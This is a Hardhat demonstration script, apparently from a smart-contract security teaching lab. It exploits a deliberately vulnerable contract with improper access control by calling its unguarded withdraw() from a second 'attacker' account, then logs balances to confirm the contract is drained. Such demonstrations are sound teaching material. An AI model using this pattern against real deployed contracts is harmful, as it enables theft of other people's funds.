const { ethers } = require("hardhat");
const fs = require("fs");
const path = require("path");

async function main() {
  console.log("🚀 Initiating attack on SC01_ImproperAccessControl_Vulnerable...");

  // --- 1. GET THE SIGNERS ---
  // getSigners() returns the accounts configured in Hardhat.
  // The first account (signers[0]) is the default deployer.
  // We will use the second account (signers[1]) as our attacker.
  const [deployer, attacker] = await ethers.getSigners();

  console.log(`Deployer (Victim) Address: ${deployer.address}`);
  console.log(`Attacker Address: ${attacker.address}`);

  // --- 2. GET THE DEPLOYED CONTRACT ---
  // We need the address of the deployed vulnerable contract.
  // For this demo, we'll assume the frontend .env file has the address.
  // In a real scenario, an attacker would find this on the blockchain.
  const envPath = path.join(__dirname, "..", "frontend", ".env");
  const envFile = fs.readFileSync(envPath, "utf8");
  const addressMatch = envFile.match(/VITE_SC01_IMPROPER_ACCESS_CONTROL_VULNERABLE_ADDRESS='(.*)'/);

  if (!addressMatch) {
    throw new Error("❌ Could not find the vulnerable contract address in frontend/.env. Please deploy contracts first.");
  }
  const vulnerableContractAddress = addressMatch[1];
  console.log(`\n🎯 Target Contract Address: ${vulnerableContractAddress}`);

  const vulnerableContract = await ethers.getContractAt("SC01_ImproperAccessControl_Vulnerable", vulnerableContractAddress);

  // --- 3. EXECUTE THE ATTACK ---
  console.log("\n💰 Checking balances before the attack...");
  const contractBalanceBefore = await ethers.provider.getBalance(vulnerableContract.target);
  const attackerBalanceBefore = await ethers.provider.getBalance(attacker.address);
  console.log(`   - Contract Balance: ${ethers.formatEther(contractBalanceBefore)} ETH`);
  console.log(`   - Attacker Balance: ${ethers.formatEther(attackerBalanceBefore)} ETH`);

  console.log("\n💥 ATTACKING: Calling the vulnerable withdraw() function...");
  // Connect the contract instance to the attacker's account and send the transaction
  const tx = await vulnerableContract.connect(attacker).withdraw();
  await tx.wait();
  console.log("✅ Attack transaction successful!");

  console.log("\n💰 Checking balances after the attack...");
  const contractBalanceAfter = await ethers.provider.getBalance(vulnerableContract.target);
  const attackerBalanceAfter = await ethers.provider.getBalance(attacker.address);
  console.log(`   - Contract Balance: ${ethers.formatEther(contractBalanceAfter)} ETH`);
  console.log(`   - Attacker Balance: ${ethers.formatEther(attackerBalanceAfter)} ETH`);

  if (contractBalanceAfter === 0n) {
    console.log("\n🎉 SUCCESS: The contract has been drained!");
  } else {
    console.log("\n😞 FAILED: The contract still has funds.");
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});